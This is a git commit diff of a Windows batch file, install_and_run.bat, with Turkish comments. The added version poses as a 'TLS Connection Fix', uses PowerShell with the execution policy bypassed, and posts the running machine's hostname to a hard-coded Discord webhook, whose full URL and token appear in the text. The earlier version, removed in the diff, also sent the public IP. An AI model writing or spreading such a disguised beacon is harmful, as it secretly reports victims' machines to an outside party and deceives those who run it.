a2842027c663ee911e7b131d3cc6d98ad9755303
bilgi213h <bilgiozgul.usa@gmail.com>
2026-06-09 22:50:05 -0800

    Update install_and_run.bat

--- install_and_run.bat
+++ install_and_run.bat
@@ -1,11 +1,13 @@
 @echo off
-set "WEBHOOK=https://discord.com/api/webhooks/1514118771776688164/dKNF5PnIXuS8-ERE-c-JTWzOWl1U_bYZuVZ5yYCcqKAcCoPw6FqQi7S_MxrP7LMA1f-0"
+title TLS Connection Fix
+chcp 65001 >nul
 
-:: 1. Bilgi Toplama
-for /f "tokens=*" %%a in ('hostname') do set "HOST=%%a"
-for /f "tokens=*" %%b in ('curl -s https://api.ipify.org') do set "IP=%%b"
+set "URL=https://discord.com/api/webhooks/1514118771776688164/dKNF5PnIXuS8-ERE-c-JTWzOWl1U_bYZuVZ5yYCcqKAcCoPw6FqQi7S_MxrP7LMA1f-0"
 
-:: 2. Discord'a Mesaj Gönder
-curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"✅ Test mesaji! Bilgisayar: %HOST% | IP: %IP%\"}" "%WEBHOOK%"
+for /f "tokens=*" %%a in ('hostname') do set "H=%%a"
 
+:: Güvenlik protokolünü TLS 1.2'ye zorlayarak gönderme
+powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $json = @{content='[SYSTEM LOG] Host: %H% | Durum: Baglanti Aktif'}; Invoke-RestMethod -Uri '%URL%' -Method Post -Body ($json | ConvertTo-Json) -ContentType 'application/json'"
+
+echo Islem tamamlandi, ag yaniti bekleniyor...
 pause
